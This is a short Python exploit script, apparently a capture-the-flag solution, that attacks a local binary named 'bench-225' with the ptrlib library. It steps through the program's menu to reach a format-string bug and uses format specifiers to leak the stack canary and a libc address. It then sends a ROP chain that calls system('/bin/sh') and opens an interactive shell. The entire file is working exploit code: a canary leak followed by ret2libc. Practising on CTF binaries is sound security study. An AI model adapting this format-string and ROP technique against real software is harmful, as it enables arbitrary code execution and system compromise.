"""
Leak canary and libc addr by FSB then ROP
"""

from ptrlib import *

file = "./bench-225"
e = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sock = Process(file)
sock.debug = True

def add_10s():
    sock.sendline("1")

def add_25s():
    sock.sendline("2")

def add_45s():
    sock.sendline("3")

def bench():
    sock.sendline("4")

def motivation(fmt):
    sock.sendline("6")
    sock.sendlineafter("quote: ", fmt)
    sock.recvuntil("Quote: \"")
    return sock.recvuntil("\n").strip()

# Current Weight will be 225
for _ in range(5):
    add_45s()

# Stamina will be 44
for _ in range(6):
    bench()

input(">")

canary = int(motivation("%13$p"), 16)
print(f"canary: {canary:x}")

libc.base = int(motivation("%15$p"), 16) - 0x29d90


payload = b"A"*8
payload += p64(canary)*2
payload += p64(next(libc.gadget("ret"))) # alignment
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh\x00")))
payload += p64(libc.symbol("system"))

motivation(payload)

sock.sh()
